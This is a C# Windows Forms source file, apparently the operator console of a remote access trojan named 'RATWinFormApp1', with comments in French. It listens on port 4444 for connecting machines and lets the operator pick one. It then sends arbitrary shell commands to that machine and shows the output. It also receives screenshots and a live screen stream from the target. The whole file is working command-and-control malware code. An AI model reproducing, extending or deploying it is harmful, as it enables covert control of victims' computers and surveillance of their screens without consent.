using Global;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Global.Fonction;

namespace RATWinFormApp1.server
{
    public class Main : Form
    {
        private TcpListener server;  //Serveur TCP pour écouter les connexions entrantes
        private readonly List<TcpClient> clients;  //Liste de tous les clients connectés
        private TcpClient client = null; //un client

        private readonly List<Thread> threads;  //Liste des threads pour chaque client

        private readonly List<NetworkStream> streams;  //Liste des flux réseau pour chaque client
        private NetworkStream stream; //flux du client
        private readonly Thread listenThread;  //Thread pour écouter les connexions clients de manière asynchrone
        private string clientSelected;  //le nom du client selectionner

        private string lastCmdResponse = "Chargement..."; //la dernier response des cmd
        private readonly object lockCmdResponse = new object(); //Pour gérer la synchronisation

        //fenetre posiblement ouverte
        private Cmd clientCmd;
        private File clientFile;
        private FormStream clientFormStream;

        private MenuStrip menuStrip1;
        private ToolStripMenuItem clientToolStripMenuItem;
        private ToolStripMenuItem cmdToolStripMenuItem;
        private ToolStripMenuItem fileToolStripMenuItem;
        private ToolStripMenuItem screenToolStripMenuItem;
        private Label terminal;
        private Panel panel1;
        private Label information;
        private SplitContainer splitContainer1;
        private ToolStripMenuItem streamToolStripMenuItem;

        public Main()
        {
            InitializeComponent();
            Init();

            // Démarrage d'un thread pour écouter les connexions entrantes des clients
            listenThread = new Thread(new ThreadStart(StartServer))
            {
                IsBackground = true // Exécution en tâche de fond
            };
            listenThread.Start(); // Démarrage du thread d'écoute

            clients = new List<TcpClient>();
            streams = new List<NetworkStream>();
            threads = new List<Thread>();
        }
        private void Init()
        {
            // Gestion de la fermeture de la fenêtre
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            // Événement déclenché quand la page est charger
            this.Load += BackgroundTask;
        }

        /// <summary>
        /// tache fait en arriere plans permetant d'afficher la fenetre avant la fin
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void BackgroundTask(object sender, EventArgs e)
        {
            BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
            worker.DoWork += (s, args) => Always();  //processus a lancer
            worker.RunWorkerAsync(); //lance le processus
        }

        /// <summary>
        /// tjr appeler et ne sarrete jamais
        /// </summary>
        private void Always()
        {
            while (true)
            {
                splitContainer1.Size = ClientSize - new Size(0, 40);
                splitContainer1.SplitterDistance = 2*ClientSize.Width/3;
                Thread.Sleep(100);
            }
        }

        /// <summary>
        /// lance le server
        /// </summary>
        private void StartServer()
        {
            try
            {
                // Création du serveur pour écouter les connexions TCP sur le port 4444
                server = new TcpListener(IPAddress.Any, 4444);
                server.Start(); //demarge du serv

                while (true)
                {
                    terminal.Text += "En attente de connexion...\n";
                    try
                    {
                        client = server.AcceptTcpClient(); // Attente d'une connexion client
                        clients.Add(client);  // Ajout du client à la liste des clients connectés

                        terminal.Text += "Client connecté !\n";

                        stream = client.GetStream(); // Récupération du flux réseau pour ce client
                        streams.Add(stream);  // Ajout du flux à la liste des flux

                        // Ajout du client à la ListView avec l'adresse IP du client
                        string clientName = client.Client.RemoteEndPoint.ToString();  // Récupération de l'adresse IP du client

                        ToolStripMenuItem newClientToolStripItem = new ToolStripMenuItem
                        {
                            Text = clientName
                        };
                        newClientToolStripItem.Click += NewClientSelected;

                        clientToolStripMenuItem.DropDownItems.Add(newClientToolStripItem);

                        // Démarrage d'un thread pour gérer la communication avec ce client
                        Thread clientThread = new Thread(() => HandleClient(client, stream))
                        {
                            IsBackground = true  // Exécution en tâche de fond
                        };
                        clientThread.Start();  // Démarrage du thread de gestion du client
                        lock (threads)
                        {
                            threads.Add(clientThread);
                        }
                    }
                    catch (Exception ex)
                    {
                        foreach (var client in clients)
                        {
                            client.Close();  // Fermeture de chaque client
                        }
                        server?.Stop();
                        terminal.Text += "Erreur : " + ex.Message + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Serveur : " + ex.Message + "\n";
            }
        }

        /// <summary>
        /// action lors de la selection d'un client
        /// </summary>
        /// <param name="sender">information sur l'object</param>
        /// <param name="e">information sur l'evenement</param>
        private void NewClientSelected(object sender, EventArgs e)
        {
            if(!(((ToolStripItem)sender).Text == clientSelected))
            {
                clientSelected = ((ToolStripItem)sender).Text;

                BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
                worker.DoWork += (s, args) => LoadInfo();  //processus a lancer
                worker.RunWorkerAsync(); //lance le processus
            }
        }

        /// <summary>
        /// charge les info su client
        /// </summary>
        private void LoadInfo()
        {
            if (clientSelected != null)
            {
                information.Text = "client selectionner:\n";
                information.Text += $"id:{clientSelected}\n";
                lock (lockCmdResponse)
                {
                    lastCmdResponse = "Chargement..."; //pour pas avoir une vielle reponse
                }

                if (SendCommand("cd"))
                {

                    int timeout = 2000;
                    int waited = 0;
                    //limite une duree max
                    while (waited < timeout)
                    {
                        lock (lockCmdResponse)
                        {
                            if (lastCmdResponse != "Chargement...") break; //verifie un changement
                        }

                        Thread.Sleep(100); //pour pas surcharger
                        waited += 100;
                    }

                    information.Text += $"dir:{lastCmdResponse}\n";
                }
                else
                {
                    information.Text += $"dir:false\n";
                }
            }   
        }



        /// <summary>
        /// gérer la communication avec un client spécifique
        /// </summary>
        /// <param name="client">le client</param>
        /// <param name="stream"></param>
        private void HandleClient(TcpClient client, NetworkStream stream)
        {
            try
            {
                string clientName = client.Client.RemoteEndPoint.ToString(); // Obtenir l'adresse du client
                // Boucle pour recevoir des données tant que le client est connecté
                while (client.Connected)
                {
                    byte[] buffer = new byte[3];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string prefix = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        // Vérifier si c'est une capture d'écran (binaire) ou un texte (réponse de commande)
                        if (prefix == Prefix.CMD.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille
                            int size = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion en entier

                            byte[] reponse = new byte[size];  // Tableau pour contenir les données de l'image

                            bytesRead = 0;
                            // Lecture des données de l'image
                            //pas juste stream.Read pour etre sur de tout lire
                            while (bytesRead < size)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(reponse, bytesRead, size - bytesRead);
                            }
                            string repTxt = Encoding.UTF8.GetString(reponse, 0, bytesRead).Trim();
                            //sauvegarde de la reponse
                            lock (lockCmdResponse)
                            {
                                lastCmdResponse = repTxt;
                            }

                            //terminal.Text += $"{client.Client.RemoteEndPoint.ToString()}:\n";
                            //terminal.Text += repTxt + "\n";
                            
                            clientCmd?.Invoke((MethodInvoker)(() =>
                            {
                                clientCmd.TerminalText += $"{clientSelected}:\n{repTxt}\n";
                            }));
                        }
                        else if (prefix == Prefix.IMG.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                            int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                            byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                            bytesRead = 0;
                            // Lecture des données de l'image
                            while (bytesRead < imageSize)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                            }
                            using (MemoryStream ms = new MemoryStream(imageData))
                            {
                                Image img = Image.FromStream(ms);
                                if (clientSelected == clientName && clientFormStream != null)
                                {
                                    clientFormStream.Img = img;
                                }
                            }
                        }
                    }
                    else
                    {
                        break;
                    }
                    /*
                    byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                        stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                        int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                        byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                        int bytesRead = 0;
                        // Lecture des données de l'image
                        while (bytesRead < imageSize)
                    {
                        // Lire les données du flux
                        bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                    }
                    /*
                    if (jack == 1)
                    {
                        string filePath = $"C:/Users/Nico/Pictures/screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                        File.WriteAllBytes(filePath, imageData);
                        terminal.Text += $"Capture d'écran enregistrée : {filePath}";
                        jack = 0;
                    }

                    // Conversion des données de l'image en objet Image
                    using (MemoryStream ms = new MemoryStream(imageData))
                    {
                        // Créer l'image depuis le flux de données
                        Image img = Image.FromStream(ms);
                        // Vérifier si ce client est bien le client sélectionné avant d'afficher l'image
                        listViewClients.Invoke(new MethodInvoker(delegate
                        {
                            if (listViewClients.SelectedItems.Count > 0 &&
                                listViewClients.SelectedItems[0].Text == clientName)
                            {
                                pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height);
                            }
                        }));
                        // Mise à jour de l'image affichée dans la PictureBox
                        //pictureBox.Invoke(new MethodInvoker(delegate { pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height); }));
                    }*/

                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Client : " + ex.Message + "\n";
            }
            finally
            {
                terminal.Text += $"{client.Client.RemoteEndPoint.ToString()} s'est deconnecter.\n";
                RemoveClient(client.Client.RemoteEndPoint.ToString());
            }
        }

        /// <summary>
        /// retire le client de la liste des possibiliter et refresh les infos si besoin
        /// </summary>
        /// <param name="clientName">le nom du client a suprimer</param>
        private void RemoveClient(string clientName)
        {
            for (int i = 0; i < clientToolStripMenuItem.DropDownItems.Count; i++)
            {
                if (clientToolStripMenuItem.DropDownItems[i] is ToolStripMenuItem toolStrip && toolStrip.Text == clientName)
                {
                    clientToolStripMenuItem.DropDownItems.RemoveAt(i);
                    clients.RemoveAt(i);
                    streams.RemoveAt(i);
                    
                    lock (threads)
                    {
                        threads.RemoveAt(i);
                    }
                    break;
                }
            }


            if (clientSelected == clientName)
            {
                if (clientToolStripMenuItem.DropDownItems.Count > 0)
                {
                    clientSelected = clientToolStripMenuItem.DropDownItems[0].Text;
                    LoadInfo();
                }
                else
                {
                    clientSelected = null;
                    information.Text = "NOTHING";
                }
            }
            if (clientCmd != null)
            {
                clientCmd.TerminalText = "";
            }
        }

        /// <summary>
        /// envoie les commande au serveur
        /// </summary>
        /// <param name="command">la command</param>
        public bool SendCommand(string command)
        {
            if (clientSelected != null)
            {
                //obtien la position du client
                int clientIndex = 0;
                foreach (ToolStripMenuItem toolStrip in clientToolStripMenuItem.DropDownItems)
                {
                    if (toolStrip.Text == clientSelected)
                    {
                        break;
                    }
                    clientIndex++;
                }
                //Vérifie si l'index est valide
                if (clientIndex >= streams.Count) 
                {
                    return false;
                }

                NetworkStream selectedStream = streams[clientIndex]; //obtien le flux du client

                //Vérifie si le stream est utilisable
                if (selectedStream == null || !selectedStream.CanWrite) 
                {
                    return false;
                }

                if (!string.IsNullOrEmpty(command)) //si y a une commande
                {
                    byte[] data = Encoding.UTF8.GetBytes(command); //encode la commande

                    Fonction.SendSize(data, selectedStream); //envoie la taille de la commande

                    selectedStream.Write(data, 0, data.Length); //envoie la commande
                    selectedStream.Flush();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }


        /// <summary>
        /// appeler lors de la fermeture de la fenetre
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var client in clients)
            {
                // Effectuer un flush si nécessaire pour s'assurer que toutes les données sont envoyées
                stream.Flush();

                // Fermer proprement le stream et la connexion
                stream.Close();
                client.Close();  // Fermeture de chaque client
            }
            /*
            if (server != null)
            {
                server.Stop(); //arret du serv
            }*/

            server?.Stop();//arret du serv
            Application.Exit();
            Environment.Exit(0); // Forcer la fermeture complète
        }


        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.clientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.screenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.streamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.terminal = new System.Windows.Forms.Label();
            this.panel1 = new System.Windows.Forms.Panel();
            this.information = new System.Windows.Forms.Label();
            this.splitContainer1 = new System.Windows.Forms.SplitContainer();
            this.menuStrip1.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
            this.splitContainer1.Panel1.SuspendLayout();
            this.splitContainer1.Panel2.SuspendLayout();
            this.splitContainer1.SuspendLayout();
            this.SuspendLayout();
            // 
            // menuStrip1
            // 
            this.menuStrip1.GripMargin = new System.Windows.Forms.Padding(2, 2, 0, 2);
            this.menuStrip1.ImageScalingSize = new System.Drawing.Size(32, 32);
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.clientToolStripMenuItem,
            this.cmdToolStripMenuItem,
            this.fileToolStripMenuItem,
            this.screenToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(729, 42);
            this.menuStrip1.TabIndex = 0;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // clientToolStripMenuItem
            // 
            this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
            this.clientToolStripMenuItem.Size = new System.Drawing.Size(92, 38);
            this.clientToolStripMenuItem.Text = "client";
            // 
            // cmdToolStripMenuItem
            // 
            this.cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
            this.cmdToolStripMenuItem.Size = new System.Drawing.Size(80, 38);
            this.cmdToolStripMenuItem.Text = "cmd";
            this.cmdToolStripMenuItem.Click += new System.EventHandler(this.CmdToolStripMenuItem_Click);
            // 
            // fileToolStripMenuItem
            // 
            this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
            this.fileToolStripMenuItem.Size = new System.Drawing.Size(67, 38);
            this.fileToolStripMenuItem.Text = "file";
            this.fileToolStripMenuItem.Click += new System.EventHandler(this.FileToolStripMenuItem_Click);
            // 
            // screenToolStripMenuItem
            // 
            this.screenToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.streamToolStripMenuItem});
            this.screenToolStripMenuItem.Name = "screenToolStripMenuItem";
            this.screenToolStripMenuItem.Size = new System.Drawing.Size(103, 38);
            this.screenToolStripMenuItem.Text = "screen";
            // 
            // streamToolStripMenuItem
            // 
            this.streamToolStripMenuItem.Name = "streamToolStripMenuItem";
            this.streamToolStripMenuItem.Size = new System.Drawing.Size(219, 44);
            this.streamToolStripMenuItem.Text = "stream";
            this.streamToolStripMenuItem.Click += new System.EventHandler(this.StreamToolStripMenuItem_Click);
            // 
            // terminal
            // 
            this.terminal.AutoSize = true;
            this.terminal.Location = new System.Drawing.Point(0, 0);
            this.terminal.Name = "terminal";
            this.terminal.Size = new System.Drawing.Size(94, 25);
            this.terminal.TabIndex = 0;
            this.terminal.Text = "terminal:\n";
            // 
            // panel1
            // 
            this.panel1.AutoScroll = true;
            this.panel1.Controls.Add(this.terminal);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(360, 454);
            this.panel1.TabIndex = 2;
            // 
            // information
            // 
            this.information.Dock = System.Windows.Forms.DockStyle.Fill;
            this.information.Location = new System.Drawing.Point(0, 0);
            this.information.Name = "information";
            this.information.Size = new System.Drawing.Size(365, 454);
            this.information.TabIndex = 1;
            this.information.Text = "client selectionner:\n";
            // 
            // splitContainer1
            // 
            this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainer1.Location = new System.Drawing.Point(0, 42);
            this.splitContainer1.Name = "splitContainer1";
            // 
            // splitContainer1.Panel1
            // 
            this.splitContainer1.Panel1.Controls.Add(this.information);
            // 
            // splitContainer1.Panel2
            // 
            this.splitContainer1.Panel2.Controls.Add(this.panel1);
            this.splitContainer1.Size = new System.Drawing.Size(729, 454);
            this.splitContainer1.SplitterDistance = 365;
            this.splitContainer1.TabIndex = 3;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(729, 496);
            this.Controls.Add(this.splitContainer1);
            this.Controls.Add(this.menuStrip1);
            this.Name = "Main";
            this.Text = "Main";
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.splitContainer1.Panel1.ResumeLayout(false);
            this.splitContainer1.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).EndInit();
            this.splitContainer1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion


        private void CmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientCmd?.Close();
            clientCmd = new Cmd(this);
            clientCmd.Show(); //affiche et oblige a rester sur lui
        }
        private void FileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientFile?.Close();
            clientFile = new File();
            clientFile.Show(); //affiche et oblige a rester sur lui
        }

        private void StreamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientFormStream?.Close();
            clientFormStream = new FormStream(Properties.Resources.nothing);
            clientFormStream.Show(); //affiche et oblige a rester sur lui
        }
    }
}
